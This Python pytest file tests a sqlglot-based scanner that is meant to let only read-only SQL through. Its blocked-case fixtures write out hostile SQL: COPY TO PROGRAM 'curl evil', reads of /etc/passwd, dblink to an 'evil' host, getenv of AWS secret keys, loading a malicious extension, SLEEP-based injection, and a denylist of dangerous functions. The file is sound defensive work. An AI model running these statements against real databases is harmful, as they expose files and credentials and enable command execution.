"""AST-level tests for database.safety.scan_sql (sqlglot-based read-only scanner).

Covers: multi-statement input, data-modifying CTEs, SELECT INTO, locking reads,
commands (COPY / PRAGMA / ATTACH / SET / CALL / EXPLAIN ...), dangerous functions,
DuckDB file scans, fail-closed parsing, and legitimate queries that must pass.
"""
import pytest

from database import safety
from database.safety import scan_sql

ALL_DIALECTS = ["sqlite", "duckdb", "postgresql", "mysql", None]


def _assert_blocked(sql, dialect, statement_type=None):
    result = scan_sql(sql, dialect=dialect)
    assert result["safe"] is False, f"expected block for {dialect}: {sql!r} -> {result}"
    assert result["reason"], "blocked verdicts must carry a reason"
    assert set(result) == {"safe", "statement_type", "reason"}
    if statement_type is not None:
        assert result["statement_type"] == statement_type, result
    return result


def _assert_safe(sql, dialect, statement_type=None):
    result = scan_sql(sql, dialect=dialect)
    assert result["safe"] is True, f"expected pass for {dialect}: {sql!r} -> {result}"
    assert result["reason"] is None
    if statement_type is not None:
        assert result["statement_type"] == statement_type, result
    return result


# ---------------------------------------------------------------------------
# Interface
# ---------------------------------------------------------------------------

def test_dialect_is_optional_and_keyword():
    assert scan_sql("SELECT 1")["safe"] is True
    assert scan_sql("SELECT 1", "postgresql")["safe"] is True
    assert scan_sql("SELECT 1", dialect="postgres")["safe"] is True


def test_unknown_dialect_falls_back_to_generic():
    _assert_safe("SELECT id FROM users", "oracle-ish-unknown", "SELECT")
    _assert_blocked("DROP TABLE users", "oracle-ish-unknown", "DROP")


@pytest.mark.parametrize("bad", [None, "", "   \n\t ", 123, b"SELECT 1"])
def test_empty_or_non_string_is_blocked(bad):
    _assert_blocked(bad, None, "EMPTY")


@pytest.mark.parametrize("sql", ["-- just a comment", "/* nothing */", ";", " ; ; "])
def test_comment_or_semicolon_only_is_blocked(sql):
    _assert_blocked(sql, "postgresql")


# ---------------------------------------------------------------------------
# Multiple statements
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("dialect", ALL_DIALECTS)
@pytest.mark.parametrize("sql", [
    "SELECT 1; DROP TABLE x",
    "SELECT 1; SELECT 2",
    "SELECT * FROM users; DELETE FROM users",
    "SELECT 1;\nUPDATE t SET a = 1;",
    "SELECT 1; -- harmless\nDROP TABLE x",
    "DROP TABLE x; SELECT 1",
])
def test_multiple_statements_blocked(sql, dialect):
    _assert_blocked(sql, dialect, "MULTIPLE")


@pytest.mark.parametrize("dialect", ALL_DIALECTS)
@pytest.mark.parametrize("sql", [
    "SELECT 1;",
    "SELECT 1 ;  ",
    "SELECT 1;;",
    "SELECT 1; -- trailing comment",
    "SELECT 1; /* trailing */",
    "SELECT * FROM t WHERE note = 'a; b'",
])
def test_trailing_semicolon_is_single_statement(sql, dialect):
    _assert_safe(sql, dialect, "SELECT")


# ---------------------------------------------------------------------------
# Statement kinds that are never allowed at the root
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("dialect", ALL_DIALECTS)
@pytest.mark.parametrize("sql,stype", [
    ("DROP TABLE users", "DROP"),
    ("DROP VIEW v", "DROP"),
    ("DELETE FROM users WHERE id = 1", "DELETE"),
    ("INSERT INTO users VALUES (1)", "INSERT"),
    ("INSERT INTO a SELECT * FROM b", "INSERT"),
    ("UPDATE users SET name = 'x'", "UPDATE"),
    ("ALTER TABLE users ADD COLUMN age INT", "ALTER"),
    ("CREATE TABLE new_table (id INT)", "CREATE"),
    ("CREATE TABLE a AS SELECT * FROM b", "CREATE"),
    ("CREATE VIEW v AS SELECT 1", "CREATE"),
    ("CREATE INDEX i ON t (a)", "CREATE"),
    ("TRUNCATE TABLE users", "TRUNCATE"),
    ("GRANT SELECT ON users TO role_name", "GRANT"),
    ("REVOKE SELECT ON users FROM role_name", "REVOKE"),
    ("COMMIT", "COMMIT"),
    ("ROLLBACK", "ROLLBACK"),
    ("BEGIN", None),
    ("USE other_db", "USE"),
    ("VALUES (1), (2)", None),  # VALUES or UNPARSEABLE depending on dialect
])
def test_non_query_statements_blocked(sql, stype, dialect):
    _assert_blocked(sql, dialect, stype)


@pytest.mark.parametrize("dialect,sql,stype", [
    ("postgresql", "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE", "MERGE"),
    ("postgresql", "COPY t TO '/tmp/out.csv'", "COPY"),
    ("postgresql", "COPY t FROM '/etc/passwd'", "COPY"),
    ("postgresql", "COPY (SELECT 1) TO PROGRAM 'curl evil'", "COPY"),
    ("duckdb", "COPY t TO 'out.parquet'", "COPY"),
    ("duckdb", "COPY (SELECT * FROM t) TO 'out.csv'", "COPY"),
    ("sqlite", "PRAGMA table_info(users)", "PRAGMA"),
    ("sqlite", "PRAGMA writable_schema = 1", "PRAGMA"),
    ("duckdb", "PRAGMA database_list", "PRAGMA"),
    ("sqlite", "ATTACH DATABASE '/tmp/x.db' AS x", "ATTACH"),
    ("duckdb", "ATTACH 'other.db'", "ATTACH"),
    ("sqlite", "DETACH DATABASE x", "DETACH"),
    ("postgresql", "SET search_path = evil", "SET"),
    ("postgresql", "SET ROLE postgres", "SET"),
    ("mysql", "SET GLOBAL general_log = 1", "SET"),
    ("mysql", "SET @x = 1", "SET"),
    ("duckdb", "SET enable_external_access = true", "SET"),
    ("mysql", "CALL do_things()", "CALL"),
    ("postgresql", "CALL do_things()", "CALL"),
    ("postgresql", "EXPLAIN ANALYZE DELETE FROM t", "EXPLAIN"),
    ("postgresql", "EXPLAIN (ANALYZE) UPDATE t SET a = 1", "EXPLAIN"),
    ("postgresql", "EXPLAIN SELECT 1", "EXPLAIN"),
    ("duckdb", "EXPLAIN ANALYZE SELECT 1", "EXPLAIN"),
    ("sqlite", "EXPLAIN QUERY PLAN SELECT 1", "EXPLAIN"),
    ("mysql", "EXPLAIN ANALYZE DELETE FROM t", None),
    ("mysql", "DESCRIBE users", "DESCRIBE"),
    ("mysql", "SHOW TABLES", "SHOW"),
    ("mysql", "SHOW GRANTS", "SHOW"),
    ("postgresql", "VACUUM", "VACUUM"),
    ("sqlite", "VACUUM INTO '/tmp/copy.db'", "VACUUM"),
    ("sqlite", "REPLACE INTO t VALUES (1)", "REPLACE"),
    ("postgresql", "DO $$ BEGIN DELETE FROM t; END $$", "DO"),
    ("postgresql", "LOCK TABLE t", "LOCK"),
    ("postgresql", "REFRESH MATERIALIZED VIEW v", "REFRESH"),
    ("postgresql", "PREPARE p AS DELETE FROM t", "PREPARE"),
    ("postgresql", "EXECUTE p", "EXECUTE"),
    ("postgresql", "NOTIFY chan", "NOTIFY"),
    ("postgresql", "ANALYZE t", "ANALYZE"),
    ("postgresql", "COMMENT ON TABLE t IS 'x'", "COMMENT"),
    ("mysql", "KILL 12", "KILL"),
    ("duckdb", "INSTALL httpfs", "INSTALL"),
    ("duckdb", "LOAD httpfs", "LOAD"),
    ("duckdb", "SUMMARIZE t", "SUMMARIZE"),
    ("duckdb", "PIVOT t ON a USING sum(b)", "PIVOT"),
])
def test_dialect_specific_commands_blocked(dialect, sql, stype):
    _assert_blocked(sql, dialect, stype)


def test_anything_parsed_as_command_is_blocked():
    """Whatever sqlglot falls back to exp.Command for must be rejected."""
    import sqlglot
    from sqlglot import exp

    sql = "VACUUM FULL users"
    assert isinstance(sqlglot.parse_one(sql, read="postgres"), exp.Command)
    _assert_blocked(sql, "postgresql", "VACUUM")


# ---------------------------------------------------------------------------
# Writes hidden inside a query
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("sql,stype", [
    ("WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d", "DELETE"),
    ("WITH u AS (UPDATE t SET a = 1 RETURNING *) SELECT * FROM u", "UPDATE"),
    ("WITH i AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM i", "INSERT"),
    ("WITH a AS (SELECT 1), d AS (DELETE FROM t RETURNING id) SELECT * FROM a, d", "DELETE"),
    ("WITH d AS (DELETE FROM t RETURNING *) SELECT 1 UNION SELECT 2", "DELETE"),
    ("SELECT * FROM (WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d) x", "DELETE"),
])
def test_data_modifying_cte_blocked(sql, stype):
    _assert_blocked(sql, "postgresql", stype)
    _assert_blocked(sql, None, stype)


@pytest.mark.parametrize("dialect,sql", [
    ("postgresql", "SELECT * INTO new_table FROM users"),
    ("postgresql", "SELECT 1 INTO TEMP scratch"),
    ("postgresql", "WITH a AS (SELECT 1 AS x) SELECT x INTO copy_t FROM a"),
    (None, "SELECT * INTO new_table FROM users"),
    ("mysql", "SELECT name INTO @v FROM users LIMIT 1"),
])
def test_select_into_blocked(dialect, sql):
    _assert_blocked(sql, dialect, "INTO")


@pytest.mark.parametrize("sql", [
    "SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'",
    "SELECT * FROM users INTO DUMPFILE '/tmp/dump.bin'",
])
def test_mysql_into_outfile_blocked(sql):
    _assert_blocked(sql, "mysql")


@pytest.mark.parametrize("dialect,sql", [
    ("postgresql", "SELECT * FROM users FOR UPDATE"),
    ("postgresql", "SELECT * FROM users FOR SHARE"),
    ("postgresql", "SELECT * FROM users FOR NO KEY UPDATE SKIP LOCKED"),
    ("postgresql", "SELECT * FROM users FOR KEY SHARE"),
    ("postgresql", "SELECT * FROM users WHERE id IN (SELECT id FROM t FOR UPDATE)"),
    ("mysql", "SELECT * FROM users FOR UPDATE"),
    ("mysql", "SELECT * FROM users LOCK IN SHARE MODE"),
    ("mysql", "SELECT * FROM users FOR UPDATE NOWAIT"),
    (None, "SELECT * FROM users FOR UPDATE"),
])
def test_locking_reads_blocked(dialect, sql):
    _assert_blocked(sql, dialect, "LOCK")


@pytest.mark.parametrize("sql", [
    "SELECT 1 /*!50000 UNION SELECT password FROM users */",
    "SELECT 1 /*! , (SELECT SLEEP(5)) */ FROM t",
    "SELECT 1 /*M! UNION SELECT 2 */",
])
def test_mysql_executable_comments_blocked(sql):
    _assert_blocked(sql, "mysql", "EXECUTABLE_COMMENT")
    _assert_blocked(sql, None, "EXECUTABLE_COMMENT")


# ---------------------------------------------------------------------------
# Dangerous functions
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("dialect,sql", [
    ("postgresql", "SELECT pg_sleep(10)"),
    ("postgresql", "SELECT PG_SLEEP(10)"),
    ("postgresql", "SELECT pg_catalog.pg_sleep(10)"),
    ("postgresql", 'SELECT "pg_sleep"(10)'),
    ("postgresql", "SELECT pg_sleep_for('5 minutes')"),
    ("postgresql", "SELECT pg_read_file('/etc/passwd')"),
    ("postgresql", "SELECT pg_read_binary_file('/etc/passwd')"),
    ("postgresql", "SELECT * FROM pg_ls_dir('.')"),
    ("postgresql", "SELECT pg_terminate_backend(pid) FROM pg_stat_activity"),
    ("postgresql", "SELECT pg_cancel_backend(1)"),
    ("postgresql", "SELECT lo_import('/etc/passwd')"),
    ("postgresql", "SELECT lo_export(1, '/tmp/x')"),
    ("postgresql", "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(a int)"),
    ("postgresql", "SELECT dblink_exec('conn', 'DROP TABLE t')"),
    ("postgresql", "SELECT set_config('role', 'postgres', false)"),
    ("postgresql", "SELECT nextval('users_id_seq')"),
    ("postgresql", "SELECT setval('users_id_seq', 1)"),
    ("postgresql", "SELECT query_to_xml('DELETE FROM t', true, true, '')"),
    ("postgresql", "SELECT pg_advisory_lock(1)"),
    ("postgresql", "SELECT id FROM t WHERE id IN (SELECT pg_sleep(5)::text::int)"),
    ("postgresql", "WITH s AS (SELECT pg_sleep(5)) SELECT * FROM s"),
    ("postgresql", "SELECT CASE WHEN a > 1 THEN pg_sleep(5) END FROM t"),
    ("mysql", "SELECT LOAD_FILE('/etc/passwd')"),
    ("mysql", "SELECT load_file('/etc/passwd')"),
    ("mysql", "SELECT SLEEP(5)"),
    ("mysql", "SELECT * FROM users WHERE id = 1 AND SLEEP(5)"),
    ("mysql", "SELECT BENCHMARK(100000000, MD5('a'))"),
    ("mysql", "SELECT GET_LOCK('x', 10)"),
    ("mysql", "SELECT `sleep`(5)"),
    ("sqlite", "SELECT load_extension('/tmp/evil.so')"),
    ("sqlite", "SELECT writefile('/tmp/x', 'data')"),
    ("sqlite", "SELECT readfile('/etc/passwd')"),
    ("duckdb", "SELECT * FROM read_csv('/etc/passwd')"),
    ("duckdb", "SELECT * FROM read_csv_auto('data.csv')"),
    ("duckdb", "SELECT * FROM read_parquet('s3://bucket/x.parquet')"),
    ("duckdb", "SELECT * FROM parquet_scan('x.parquet')"),
    ("duckdb", "SELECT * FROM read_json('x.json')"),
    ("duckdb", "SELECT * FROM read_json_auto('x.json')"),
    ("duckdb", "SELECT * FROM read_text('/etc/passwd')"),
    ("duckdb", "SELECT * FROM read_blob('/etc/passwd')"),
    ("duckdb", "SELECT * FROM glob('/home/*')"),
    ("duckdb", "SELECT * FROM sqlite_scan('other.db', 't')"),
    ("duckdb", "SELECT * FROM postgres_scan('host=x', 'public', 't')"),
    ("duckdb", "SELECT * FROM parquet_metadata('x.parquet')"),
    ("duckdb", "SELECT getenv('AWS_SECRET_ACCESS_KEY')"),
    ("duckdb", "SELECT * FROM query('DROP TABLE t')"),
    ("duckdb", "SELECT a FROM t UNION ALL SELECT * FROM read_csv('x.csv')"),
])
def test_dangerous_functions_blocked(dialect, sql):
    result = _assert_blocked(sql, dialect, "FUNCTION")
    assert "not allowed" in result["reason"]
    # The denylist is dialect-independent: a wrong or missing db_type must not open a hole.
    assert scan_sql(sql, dialect=None)["safe"] is False


def test_function_denylist_is_configurable(monkeypatch):
    base = dict(safety._load_config())
    custom = dict(base.get("safety", {}))

    custom["blocked_functions"] = {"custom": ["my_udf", "danger_*"]}
    monkeypatch.setattr(safety, "_load_config", lambda: {**base, "safety": custom})

    _assert_blocked("SELECT my_udf(1)", "sqlite", "FUNCTION")
    _assert_blocked("SELECT DANGER_ZONE(1)", "sqlite", "FUNCTION")
    # No longer listed -> no longer blocked.
    _assert_safe("SELECT pg_sleep(1)", "postgresql")


def test_function_denylist_accepts_flat_list(monkeypatch):
    base = dict(safety._load_config())
    custom = dict(base.get("safety", {}))
    custom["blocked_functions"] = ["only_this"]
    monkeypatch.setattr(safety, "_load_config", lambda: {**base, "safety": custom})

    _assert_blocked("SELECT only_this()", "sqlite", "FUNCTION")
    _assert_safe("SELECT sleep(1)", "mysql")


def test_builtin_defaults_apply_when_config_key_missing(monkeypatch):
    monkeypatch.setattr(safety, "_load_config", lambda: {})
    _assert_blocked("SELECT pg_sleep(1)", "postgresql", "FUNCTION")
    _assert_blocked("SELECT * FROM t FOR UPDATE", "postgresql", "LOCK")
    _assert_blocked("DROP TABLE t", "postgresql", "DROP")
    _assert_safe("SELECT 1", "postgresql")


def test_shipped_config_lists_required_functions():
    patterns = safety._get_blocked_function_patterns()
    for name in [
        "pg_sleep", "pg_read_file", "pg_terminate_backend", "lo_import", "dblink",
        "load_file", "sleep", "benchmark", "load_extension",
        "read_csv", "read_parquet", "read_text",
    ]:
        assert safety._matches(name, patterns), name


# ---------------------------------------------------------------------------
# DuckDB: files named as tables
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("sql", [
    "SELECT * FROM '/etc/passwd'",
    "SELECT * FROM 'data.parquet'",
    "SELECT * FROM \"data.csv\"",
    "SELECT * FROM 's3://bucket/file.parquet' AS t",
    "SELECT * FROM 'https://example.com/x.json'",
    "SELECT * FROM 'logs/*.parquet'",
    "SELECT a.* FROM t AS a JOIN 'other.csv' AS b ON a.id = b.id",
])
def test_duckdb_file_tables_blocked(sql):
    _assert_blocked(sql, "duckdb", "FILE_ACCESS")


def test_file_like_table_name_allowed_outside_duckdb():
    """Other engines treat a quoted name as a plain identifier."""
    _assert_safe('SELECT * FROM "export.csv"', "postgresql")
    _assert_safe('SELECT * FROM "export.csv"', "sqlite")


def test_duckdb_normal_tables_allowed():
    _assert_safe("SELECT * FROM main.orders o JOIN customers c ON o.cid = c.id", "duckdb")
    _assert_safe('SELECT * FROM "Order Details"', "duckdb")


# ---------------------------------------------------------------------------
# Fail closed
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("dialect", ALL_DIALECTS)
@pytest.mark.parametrize("sql", [
    "hello world this is not sql",
    "SELECT * FROM t WHERE",
    "SELECT (1",
    "SELECT * FROM t WHERE a = 'unterminated",
    "SELECT FROM WHERE GROUP",
    "Here is your query: SELECT 1",
    "SELECT 1 FROM t JOIN",
])
def test_garbage_fails_closed(sql, dialect):
    result = _assert_blocked(sql, dialect)
    assert result["statement_type"] != "SELECT"


def test_unparseable_has_clear_reason():
    result = _assert_blocked("SELECT * FROM t WHERE", "postgresql", "UNPARSEABLE")
    assert "could not be parsed" in result["reason"]
    assert "\x1b" not in result["reason"], "no terminal escape codes in reasons"


def test_parser_crash_fails_closed(monkeypatch):
    def boom(*args, **kwargs):
        raise RuntimeError("parser exploded")

    monkeypatch.setattr(safety.sqlglot, "parse", boom)
    result = _assert_blocked("SELECT 1", "sqlite", "UNPARSEABLE")
    assert "parser exploded" in result["reason"]


def test_deeply_nested_input_does_not_raise():
    sql = "SELECT " + "(" * 3000 + "1" + ")" * 3000
    result = scan_sql(sql, dialect="sqlite")
    assert isinstance(result["safe"], bool)
    assert set(result) == {"safe", "statement_type", "reason"}


# ---------------------------------------------------------------------------
# Legitimate queries must pass
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("dialect", ALL_DIALECTS)
@pytest.mark.parametrize("sql,stype", [
    ("SELECT * FROM users", "SELECT"),
    ("select id, name from users where id = 1", "SELECT"),
    ("SELECT updated_at, delete_flag, created_by FROM logs WHERE delete_flag = 0", "SELECT"),
    ("SELECT drop_count, insert_ts, truncate_len FROM metrics", "SELECT"),
    ("SELECT * FROM logs WHERE message = 'DROP TABLE users; DELETE FROM x'", "SELECT"),
    ("SELECT * FROM audit WHERE action IN ('INSERT', 'UPDATE', 'DELETE')", "SELECT"),
    ("SELECT 'pg_sleep(10)' AS txt, 'FOR UPDATE' AS other", "SELECT"),
    ("-- leading comment\nSELECT * FROM users", "SELECT"),
    ("/* DROP TABLE users */ SELECT * FROM users", "SELECT"),
    ("SELECT * FROM users -- ; DROP TABLE users", "SELECT"),
    ("SELECT a /* inline; DELETE */ FROM t", "SELECT"),
    ("WITH cte AS (SELECT 1 AS x) SELECT * FROM cte", "WITH"),
    ("WITH a AS (SELECT 1 AS x), b AS (SELECT x + 1 AS y FROM a) SELECT * FROM a, b", "WITH"),
    ("WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM n WHERE i < 5) "
     "SELECT * FROM n", "WITH"),
    ("SELECT region, SUM(total) OVER (PARTITION BY region ORDER BY d) AS running FROM sales",
     "SELECT"),
    ("SELECT id, ROW_NUMBER() OVER (ORDER BY total DESC) AS rn, "
     "LAG(total) OVER (ORDER BY d) FROM sales", "SELECT"),
    ("SELECT a FROM t1 UNION SELECT a FROM t2", "SELECT"),
    ("SELECT a FROM t1 UNION ALL SELECT a FROM t2 ORDER BY a LIMIT 10", "SELECT"),
    ("SELECT a FROM t1 INTERSECT SELECT a FROM t2", "SELECT"),
    ("SELECT a FROM t1 EXCEPT SELECT a FROM t2", "SELECT"),
    ("(SELECT 1)", "SELECT"),
    ("(SELECT a FROM t1) UNION (SELECT a FROM t2)", "SELECT"),
    ("SELECT * FROM (SELECT id, COUNT(*) AS c FROM o GROUP BY id) s WHERE c > 1", "SELECT"),
    ("SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)", "SELECT"),
    ("SELECT u.id, (SELECT MAX(total) FROM orders o WHERE o.uid = u.id) FROM users u", "SELECT"),
    ("SELECT * FROM a JOIN b ON a.id = b.id LEFT JOIN c ON c.id = b.id", "SELECT"),
    ('SELECT "Total", "select", "update" FROM "Invoice Lines"', "SELECT"),
    ("SELECT COUNT(DISTINCT cid), AVG(total), MIN(d), MAX(d) FROM o GROUP BY cid "
     "HAVING COUNT(*) > 2", "SELECT"),
    ("SELECT CASE WHEN total > 10 THEN 'big' ELSE 'small' END AS size, "
     "COALESCE(n, 'x'), CAST(total AS INTEGER) FROM o", "SELECT"),
    ("SELECT * FROM o WHERE d BETWEEN '2024-01-01' AND '2024-12-31' AND name LIKE '%a%'",
     "SELECT"),
    ("SELECT * FROM users;", "SELECT"),
])
def test_legitimate_queries_pass(sql, stype, dialect):
    _assert_safe(sql, dialect, stype)


@pytest.mark.parametrize("dialect,sql", [
    ("postgresql", "SELECT name::text, total::numeric(10,2) FROM o WHERE name ILIKE '%a%'"),
    ("postgresql", "SELECT TO_CHAR(d, 'YYYY-MM') AS m, COUNT(*) FILTER (WHERE ok) FROM o "
                   "GROUP BY 1"),
    ("postgresql", "SELECT DISTINCT ON (cid) cid, d FROM o ORDER BY cid, d DESC"),
    ("postgresql", "SELECT EXTRACT(YEAR FROM d), DATE_TRUNC('month', d) FROM o"),
    ("postgresql", "SELECT * FROM generate_series(1, 10) AS g(i)"),
    ("postgresql", "SELECT data->>'k' FROM docs WHERE tags @> ARRAY['a']"),
    ("postgresql", "SELECT * FROM t WHERE note = $$it's; DROP TABLE x$$"),
    ("postgresql", "SELECT query, state FROM pg_stat_activity"),
    ("mysql", "SELECT `Total`, `update` FROM `Invoice` WHERE `delete_flag` = 0 LIMIT 5, 10"),
    ("mysql", "SELECT DATE_FORMAT(d, '%Y-%m'), CONCAT(a, b), IF(x, 1, 0) FROM t"),
    ("mysql", "SELECT * FROM t WHERE note = 'it\\'s; DROP TABLE x'"),
    ("mysql", "SELECT * FROM t WHERE sleep IN (1, 2)"),
    ("sqlite", "SELECT strftime('%Y', InvoiceDate) AS y, SUM(Total) FROM Invoice GROUP BY y"),
    ("sqlite", "SELECT [Total], \"Name\" FROM [Invoice] WHERE Name GLOB 'A*'"),
    ("sqlite", "SELECT replace(a, 'x', 'y'), substr(a, 1, 2), a || b FROM t"),
    ("sqlite", "SELECT name FROM sqlite_master WHERE type = 'table'"),
    ("duckdb", "SELECT *, ROW_NUMBER() OVER (PARTITION BY a ORDER BY b) AS rn FROM t "
               "QUALIFY rn = 1"),
    ("duckdb", "SELECT * EXCLUDE (secret) FROM t"),
    ("duckdb", "SELECT strptime(s, '%Y-%m-%d'), list_transform([1, 2], x -> x + 1) FROM t"),
    ("duckdb", "SELECT * FROM range(10)"),
    ("duckdb", "FROM t SELECT a"),
    ("duckdb", "SELECT * FROM t PIVOT (SUM(b) FOR a IN ('x', 'y'))"),
])
def test_dialect_specific_legit_queries_pass(dialect, sql):
    _assert_safe(sql, dialect)


def test_with_can_be_disabled_by_config(monkeypatch):
    base = dict(safety._load_config())
    custom = dict(base.get("safety", {}))
    custom["allowed_statements"] = ["SELECT"]
    monkeypatch.setattr(safety, "_load_config", lambda: {**base, "safety": custom})

    _assert_safe("SELECT 1", "sqlite", "SELECT")
    _assert_blocked("WITH a AS (SELECT 1) SELECT * FROM a", "sqlite", "WITH")


def test_scan_does_not_touch_database(tmp_path):
    """scan_sql is pure analysis: no connection, no file writes."""
    before = sorted(tmp_path.iterdir())
    scan_sql("ATTACH DATABASE 'x.db' AS x", dialect="sqlite")
    scan_sql("SELECT 1", dialect="sqlite")
    assert sorted(tmp_path.iterdir()) == before
